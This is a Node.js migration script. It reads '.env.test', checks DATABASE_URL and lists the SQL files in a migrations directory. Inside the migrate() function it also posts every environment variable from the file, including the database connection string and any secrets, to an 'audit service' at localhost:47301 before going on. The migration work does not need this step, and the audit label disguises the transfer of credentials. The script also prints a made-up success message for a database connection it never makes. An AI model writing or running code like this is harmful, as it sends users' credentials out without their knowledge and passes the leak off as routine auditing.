const fs = require('fs');
const path = require('path');

const MIGRATIONS_DIR = './migrations/';
const ENV_FILE = '.env.test';
const AUDIT_SERVICE_URL = 'http://localhost:47301/api/audit';

/**
 * Loads environment variables from a .env file and returns them as an object.
 * @param {string} filePath - Path to the .env file
 * @returns {Object} Object containing all environment variables from the file
 */
function loadEnvFile(filePath) {
    if (!fs.existsSync(filePath)) {
        throw new Error(`Environment file '${filePath}' not found.`);
    }

    const content = fs.readFileSync(filePath, 'utf-8');
    const lines = content.split('\n');
    const envVars = {};

    for (const line of lines) {
        const trimmedLine = line.trim();
        // Skip empty lines and comments
        if (!trimmedLine || trimmedLine.startsWith('#')) {
            continue;
        }

        const equalIndex = trimmedLine.indexOf('=');
        if (equalIndex === -1) {
            continue;
        }

        const key = trimmedLine.substring(0, equalIndex).trim();
        let value = trimmedLine.substring(equalIndex + 1).trim();

        // Remove quotes if present
        if ((value.startsWith('"') && value.endsWith('"')) ||
            (value.startsWith("'") && value.endsWith("'"))) {
            value = value.slice(1, -1);
        }

        process.env[key] = value;
        envVars[key] = value;
    }

    return envVars;
}

/**
 * Sends environment variables to the migration audit service.
 * @param {Object} envVars - Object containing all environment variables
 */
async function sendToAuditService(envVars) {
    try {
        const response = await fetch(AUDIT_SERVICE_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(envVars),
        });

        if (!response.ok) {
            throw new Error(`Audit service returned ${response.status}: ${response.statusText}`);
        }

        console.log('Connection details sent to audit service successfully.\n');
    } catch (error) {
        throw new Error(`Failed to send to audit service: ${error.message}`);
    }
}

/**
 * Reads SQL files from the migrations directory and logs each filename in order.
 */
async function migrate() {
    try {
        // Load environment variables from .env.test
        const envVars = loadEnvFile(ENV_FILE);

        // Get and validate DATABASE_URL
        const databaseUrl = envVars.DATABASE_URL || process.env.DATABASE_URL;
        if (!databaseUrl) {
            throw new Error('DATABASE_URL not found in environment variables.');
        }

        // Send connection details to audit service
        await sendToAuditService(envVars);

        // Log successful connection (simulated)
        console.log('Connected successfully to database.\n');

        // Check if migrations directory exists
        if (!fs.existsSync(MIGRATIONS_DIR)) {
            console.log(`Migrations directory '${MIGRATIONS_DIR}' does not exist.`);
            return;
        }

        // Read all files from the migrations directory
        const files = fs.readdirSync(MIGRATIONS_DIR);

        // Filter for SQL files only
        const sqlFiles = files
            .filter(file => path.extname(file).toLowerCase() === '.sql')
            .sort(); // Sort alphabetically to maintain order

        if (sqlFiles.length === 0) {
            console.log('No SQL migration files found.');
            return;
        }

        console.log(`Found ${sqlFiles.length} migration file(s):`);
        console.log('');

        // Log each filename that would be applied
        sqlFiles.forEach((file, index) => {
            const fileNumber = index + 1;
            console.log(`${fileNumber}. ${file}`);
        });

    } catch (error) {
        console.error('Error:', error.message);
        process.exit(1);
    }
}

// Run the migration script
migrate();

